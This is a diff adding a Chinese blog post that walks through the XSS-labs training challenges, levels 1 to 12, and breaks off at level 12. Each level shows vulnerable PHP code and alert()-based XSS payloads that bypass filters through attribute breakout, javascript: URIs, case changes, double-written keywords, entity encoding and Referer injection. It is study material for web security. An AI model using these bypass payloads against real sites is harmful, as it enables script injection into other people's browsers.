@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title># XSS-labs | Fr</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://kite-007.github.io/favicon.ico?v=1616506552970">
+<link rel="stylesheet" href="https://kite-007.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+1. xss-level1
+2. xss-level2
+3. xss-level3
+4. xss-level4
+5. xss-level5
+6. xss-level6
+7. xss-level7
+8. xss-level8
+9. xss-..." />
+    <meta name="keywords" content="xss" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://kite-007.github.io">
+        <img src="https://kite-007.github.io/images/avatar.png?v=1616506552970" class="site-logo">
+        <h1 class="site-title">Fr</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://kite-007.github.io/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      意志坚定，持之以恒
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://kite-007.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title"># XSS-labs</h2>
+            <div class="post-date">2021-03-22</div>
+            
+            <div class="post-content" v-pre>
+              <p><ul class="markdownIt-TOC">
+<li><a href="#1-xss-level1">1. xss-level1</a></li>
+<li><a href="#2-xss-level2">2. xss-level2</a></li>
+<li><a href="#3-xss-level3">3. xss-level3</a></li>
+<li><a href="#4-xss-level4">4. xss-level4</a></li>
+<li><a href="#5-xss-level5">5. xss-level5</a></li>
+<li><a href="#6-xss-level6">6. xss-level6</a></li>
+<li><a href="#7-xss-level7">7. xss-level7</a></li>
+<li><a href="#8-xss-level8">8. xss-level8</a></li>
+<li><a href="#9-xss-level9">9. xss-level9</a></li>
+<li><a href="#10-xss-level10">10. xss-level10</a></li>
+<li><a href="#11-xss-level11">11. xss-level11</a></li>
+<li><a href="#12-xss-level12">12. xss-level12</a></li>
+<li><a href="#13-xss-level13">13. xss-level13</a></li>
+<li><a href="#14-xss-level14">14. xss-level14</a></li>
+<li><a href="#15-xss-level15">15. xss-level15</a></li>
+<li><a href="#16-xss-level16">16. xss-level16</a></li>
+<li><a href="#17-xss-level17">17. xss-level17</a></li>
+<li><a href="#18-xss-level18">18. xss-level18</a></li>
+<li><a href="#19-xss-level19">19. xss-level19</a></li>
+<li><a href="#20-xss-level20">20. xss-level20</a></li>
+</ul>
+(XSS)</p>
+<h1 id="1-xss-level1">1. xss-level1</h1>
+<ol>
+<li>查看文件源码；</li>
+</ol>
+<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level2.php?keyword=test&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level1&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;name&quot;];
+echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;
+?&gt;
+&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>首先，在head标签的script中重写了alert方法，它会在弹出提示的同时跳转到下一关。</li>
+<li>之后查看到它是以GET方式提交用户名，并没有对这个字符串进行过滤，所以存在xss注入。</li>
+</ul>
+<ol>
+<li>在HackBar中，显示URL:XSS/level1.php?name=test里更改test，直接执行alert方法，完成。</li>
+</ol>
+<pre><code>level1.php?name=&lt;script&gt;alert()&lt;/script&gt;
+</code></pre>
+<h1 id="2-xss-level2">2. xss-level2</h1>
+<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level3.php?writing=wait&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level2&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level2.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str.'&quot;&gt;
+&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>一样执行跳转，但是这里有.htmlspecialchars($str).对字符串进行了预定义字符转化为实体
+<ul>
+<li>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体，默认不会处理单引号。</li>
+<li>预定义的字符是：</li>
+</ul>
+</li>
+</ul>
+<pre><code>&amp; （和号）成为 &amp;amp;
+&quot; （双引号）成为 &amp;quot;
+' （单引号）成为 '
+&lt; （小于）成为 &amp;lt;
+&gt; （大于）成为 &amp;gt;
+</code></pre>
+<ul>
+<li>如需把特殊的 HTML 实体转换回字符，请使用 htmlspecialchars_decode() 函数。<br>
+我们看到在input标签中有我们提交的value的值，并没有进行过滤就进行输出，所以把input标签闭合，从而执行alert。</li>
+</ul>
+<pre><code>level2.php?keyword=&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
+</code></pre>
+<h1 id="3-xss-level3">3. xss-level3</h1>
+<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level4.php?keyword=try harder!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level3&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;
+&lt;form action=level3.php method=GET&gt;
+&lt;input name=keyword  value='&quot;.htmlspecialchars($str).&quot;'&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&quot;;
+?&gt;
+&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>我们看到这里他对value进行了预定义字符转实体的过滤，实际上单引号还是可以闭合（因为默认没有对单引号进行处理），所以用单引号对input里的value进行包裹使其为空字符串，并利用“事件”：onclick或ondblclick等的其他 <a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">HTML事件</a>。</li>
+</ul>
+<pre><code>&lt;input name=keyword  value='' onclick='alert()'&gt;
+level3.php?keyword=' onclick='alert()
+</code></pre>
+<h1 id="4-xss-level4">4. xss-level4</h1>
+<ol>
+<li>ctrl+u查看源码：</li>
+</ol>
+<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level5.php?keyword=find a way out!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level4&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和&amp;quot; ondblclick=&amp;quot;alert()相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level4.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&quot; ondblclick=&quot;alert()&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:21&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>根据前面的经验，这里的预定义字符又被过滤了，上一关的是使用单引号进行闭合，这里本应该使用双引号进行包裹，但是会发现这里双引号是会被转义的，那么怎么办？</li>
+<li>但是仔细看就会发现，这里h2标签中的双引号被转义了，input标签中并没有，所以用双引号包裹，完成。</li>
+</ul>
+<ol start="2">
+<li>php代码:</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level4.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>可以看出input标签中str3只是替换掉了尖括号，h2中则进行了预定义字符转义。</li>
+</ul>
+<h1 id="5-xss-level5">5. xss-level5</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level5.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;alert()&lt;/script&gt;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+</code></pre>
+<ul>
+<li>在h2标签中会进行预定义字符转义，value中一些特殊字符中会加上下划线</li>
+<li>过滤掉了script和事件。</li>
+</ul>
+<ol start="2">
+<li>payload,点击something超链接执行js</li>
+</ol>
+<pre><code>&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;a href=javascript:alert()&gt;something&lt;/a&gt;&quot;&gt;
+level5.php?keyword=&quot; /&gt; &lt;a href=javascript:alert()&gt;something&lt;/a&gt;
+</code></pre>
+<p>javascript:是表示在触发默认动作时，执行一段JavaScript代码，而 javascript:; 表示什么都不执行，这样点击时就没有任何反应。<br>
+href：URL    规定链接的目标 URL。</p>
+<pre><code>&lt;a href=&quot;www.baidu.com&quot;&gt;XXX&lt;/a&gt;   这个a标签的话就是指点击XXX后跳转到百度首页
+&lt;a href=&quot;javascript:;&quot;&gt;XXX&lt;/a&gt;  点击XXX后是不会跳转的，一般用于开发时页面还未完成
+</code></pre>
+<ol start="3">
+<li>php代码</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level5.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>strtolower就是将字母转换为小写并返回值</li>
+</ul>
+<ol start="4">
+<li><a href="https://www.html.cn/qa/javascript/11155.html">javascript伪协议</a>：
+<ul>
+<li>伪协议是为关联应用程序而使用的，JavaScript伪协议实际上是把javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。</li>
+<li>这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。如果javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。</li>
+<li>当浏览器装载了这样的URL时，它将执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。这个字符串值可以含有HTML标记，并被格式化，其显示与其他装载进浏览器的文档完全相同。</li>
+<li>javascript URL还可以含有只执行动作，但不返回值的javascript语句。装载了这种URL时，浏览器仅执行其中的javascript代码，但由于没有作为新文档来显示的值，因此它并不改变当前显示的文档。</li>
+</ul>
+</li>
+</ol>
+<h1 id="6-xss-level6">6. xss-level6</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和 &amp;quot; /&amp;gt; &amp;lt;a href=javascript:alert()&amp;gt;something&amp;lt;/a&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level6.php method=GET&gt;
+&lt;input name=keyword  value=&quot; &quot; /&gt; &lt;a hr_ef=javascript:alert()&gt;something&lt;/a&gt;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+</code></pre>
+<ul>
+<li>在前面的基础上过滤了href</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level6.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>发现了与上一关不同的是这里并没有对大小写进行过滤</li>
+</ul>
+<pre><code>&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;a HREF=javascript:alert()&gt;something&lt;/a&gt;&quot;&gt;
+level6.php?keyword=&quot; /&gt; &lt;a HREF=javascript:alert()&gt;something&lt;/a&gt;
+</code></pre>
+<h1 id="7-xss-level7">7. xss-level7</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和&amp;quot; /&amp;gt; &amp;lt;a href=javascript:alert()&amp;gt;something&amp;lt;/a&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level7.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;a =java:alert()&gt;something&lt;/a&gt;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+</code></pre>
+<ul>
+<li>过滤了大小写，特殊字符直接删除掉了</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str =strtolower( $_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level7.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>发现对数据进行了一次删除的过滤，所以可以进行双写包裹绕过。</li>
+</ul>
+<pre><code>&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;script&gt;alert()&lt;/script&gt;&quot;&gt;
+&quot;/&gt; &lt;scripscriptt&gt;alert()&lt;/scriscriptpt&gt;
+</code></pre>
+<h1 id="8-xss-level8">8. xss-level8</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;
+&lt;center&gt;
+&lt;form action=level8.php method=GET&gt;
+&lt;input name=keyword  value=&quot;on&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;o_n&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:3&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ul>
+<li>过滤大小写，特殊字符增加下划线，上面对预字符进行过滤，下面没有过滤尖括号。</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace('&quot;','&amp;quot',$str6);
+echo '&lt;center&gt;
+&lt;form action=level8.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+&lt;?php
+ echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+?&gt;
+&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+</code></pre>
+<ol start="3">
+<li>实体化编码，在搜索框中输入</li>
+</ol>
+<pre><code>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascrip&amp;#116;:alert()&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
+javascrip&amp;#116;:alert()
+</code></pre>
+<ul>
+<li>因为这里的过滤都是在后端进行，而在后端被实体化编码的部分可以绕过过滤，返回前端时又可以被浏览器解析为原来的样子。</li>
+</ul>
+<h1 id="9-xss-level9">9. xss-level9</h1>
+<ol>
+<li>ctrl+u,提示要有一个合法链接</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;
+&lt;center&gt;
+&lt;form action=level9.php method=GET&gt;
+&lt;input name=keyword  value=&quot;javascrip&amp;amp;#116;:alert()&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:23&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php
+if(false===strpos($str7,'http://'))
+{
+  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+        }
+else
+{
+  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+}
+?&gt;
+</code></pre>
+<ul>
+<li>这里与level8的区别，加了一个if判断语句，查询链接中是否有http://，如果没有则连接不合法。</li>
+<li>strpos：查询（http://）第一次出现的位置，布尔类型。</li>
+</ul>
+<ol start="3">
+<li>在http://前加了//表示对后面的进行了注释，从而不影响前面的代码。</li>
+</ol>
+<ul>
+<li>这里可以想出http://可以在字符串的任意位置，只要不影响恶意的代码，所以可以写再alert里面尝试。</li>
+</ul>
+<pre><code>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascrip&amp;#116;:alert()//http://&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
+javascrip&amp;#116;:alert()//http://
+javascrip&amp;#116;:alert('http://')
+</code></pre>
+<h1 id="10-xss-level10">10. xss-level10</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ul>
+<li>第一个参数keyword的预定义字符被过滤掉了，查看代码后发现还有三个隐藏掉的input，先试一试用GET方式提交参数，发现只有t_sort有显示信息，并且被过滤掉了尖括号。</li>
+<li>从t_sort入手，带有尖括号的标签不能用了，所以尝试使用事件，通过闭合value构造payload。</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str11 = $_GET[&quot;t_sort&quot;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ol start="3">
+<li>payload</li>
+</ol>
+<pre><code>level10.php?t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()
+</code></pre>
+<h1 id="11-xss-level11">11. xss-level11</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&amp;lt;'&amp;quot;c&amp;quot;'&amp;gt;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ref&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ul>
+<li>t_sort信息有回显，但是预定义字符被过滤掉了。</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_SERVER['HTTP_REFERER'];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ref&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>发现这里t_ref是有xss漏洞的，但是提交的方式并不是GET而是SERVER，可以通过HackBar进行Referer提交payload</li>
+</ul>
+<ol start="3">
+<li></li>
+</ol>
+<pre><code>http://192.168.200.1/WWW/XSS/level11.php?t_link=a&amp;t_history=b&amp;t_sort=&lt;&quot;c&quot;&gt;&amp;t_ref=d
+Referer：&quot; type=&quot;text&quot; onclick=&quot;alert()
+</code></pre>
+<h1 id="12-xss-level12">12. xss-level12</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&amp;lt;&amp;quot;c&amp;quot;&amp;gt;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ua&quot;  value=&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ul>
